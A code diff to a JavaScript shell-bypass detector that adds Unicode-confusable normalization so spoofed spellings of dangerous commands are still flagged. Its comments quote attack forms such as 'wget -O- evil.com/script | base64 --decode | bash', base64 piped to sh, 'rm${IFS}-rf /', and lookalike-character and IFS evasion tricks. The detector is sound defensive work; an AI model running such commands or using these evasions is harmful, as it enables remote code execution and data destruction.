@@ -1,6 +1,26 @@
 #!/usr/bin/env node
 "use strict";
 
+const { normalizeCommand } = require("./command-normalize");
+
+/**
+ * dual(re, raw, norm) — confusable-normalized dual-path predicate.
+ * Tests `re` against the raw string first; if `norm !== raw` (i.e. the input
+ * contained Unicode confusables / ZWJ / diacritics that normalizeCommand
+ * folded), tests the normalized form as a second arm. This mirrors the
+ * `_classifyCommandDual` pattern in decision-engine.js and the `matches`
+ * helper in risk-score.js.
+ *
+ * Pure-ASCII fast path: normalizeCommand returns the input unchanged for
+ * pure-ASCII strings, so `norm === raw` and the second arm is never reached —
+ * byte-identical behavior for all existing ASCII fixtures and corpus entries.
+ * @param {RegExp} re
+ * @param {string} raw  — original (possibly Unicode) string
+ * @param {string} norm — normalizeCommand(raw)
+ * @returns {boolean}
+ */
+const dual = (re, raw, norm) => re.test(raw) || (norm !== raw && re.test(norm));
+
 /**
  * shell-bypass-detector.js — Zero-dep regex-based shell bypass-pattern detector.
  *
@@ -46,24 +66,35 @@ const RE_NET_FETCH     = /\b(curl|wget)\b/;
  * @returns {boolean}
  */
 function isBase64PipeExec(t) {
-  const s = String(t || "");
-  return RE_BASE64_DECODE.test(s) && RE_PIPE_TO_SHELL.test(s);
+  const s    = String(t || "");
+  const norm = normalizeCommand(s); // fold Cyrillic/ZWJ/diacritic confusables
+  // Both arms of the conjunction must match — raw OR normalized (not mixed):
+  // an attacker who writes "bаse64 -d | sh" (Cyrillic а) defeats the raw
+  // regex; the normalized arm folds it to "base64 -d | sh" and catches it.
+  return dual(RE_BASE64_DECODE, s, norm) && dual(RE_PIPE_TO_SHELL, s, norm);
 }
 
 /**
  * isNetworkProcessSub — returns true when the string contains a network-fetch
  * process substitution: `bash <(curl ...)` / `sh <(wget ...)`.
  * These have no legitimate use as an MCP argument value.
+ * Confusable-normalized: "bаsh <(curl …)" (Cyrillic а) is caught via the
+ * normalized arm (ADR-020 follow-up / Track B hardening).
  * @param {string} t
  * @returns {boolean}
  */
 function isNetworkProcessSub(t) {
-  const s = String(t || "");
-  return RE_PROC_SUB.test(s) && RE_NET_FETCH.test(s);
+  const s    = String(t || "");
+  const norm = normalizeCommand(s);
+  return dual(RE_PROC_SUB, s, norm) && dual(RE_NET_FETCH, s, norm);
 }
 
 function detectBypassPatterns(command) {
   const text = String(command || "");
+  // Compute normalized form once for dual-path checks below.
+  // Pure-ASCII fast path: normalizeCommand returns input unchanged → norm === text,
+  // second arms never run, byte-identical behavior preserved for all ASCII inputs.
+  const norm = normalizeCommand(text);
   const reasons = [];
 
   // ── 1. Base64 decode piped to shell (opaque payload bypass) ──────────────
@@ -71,14 +102,17 @@ function detectBypassPatterns(command) {
   //   echo <b64> | base64 -d | sh
   //   wget -O- evil.com/script | base64 --decode | bash
   //   openssl base64 -d <<< "..." | sh
-  const hasBase64Decode = RE_BASE64_DECODE.test(text);
-  const hasBase64Pipe   = isBase64PipeExec(text);
+  // hasBase64Decode uses dual-path so Cyrillic/ZWJ-spliced "bаse64 -d" is
+  // caught for the hasEvalDynamic conjunction below.
+  const hasBase64Decode = dual(RE_BASE64_DECODE, text, norm);
+  const hasBase64Pipe   = isBase64PipeExec(text); // already dual-path internally
   if (hasBase64Pipe) reasons.push("base64-pipe-exec");
 
   // ── 2. IFS whitespace substitution (word-boundary regex defeat) ───────────
   // Catches: rm${IFS}-rf /  git${IFS}push${IFS}--force  dd${IFS}if=...
-  // The \brm\s+-rf regex requires literal whitespace; ${IFS} is not whitespace
-  // in the raw string, so word-boundary regexes fail to match.
+  // Stays raw-only: normalizeCommand folds ${IFS}→space internally, so the
+  // normalized string no longer contains "$IFS" and the second arm would miss
+  // the confusable-IFS case. The raw check is the reliable signal here.
   const hasIfsBypass = /\$\{?IFS\}?/.test(text);
   if (hasIfsBypass) reasons.push("ifs-bypass");
 
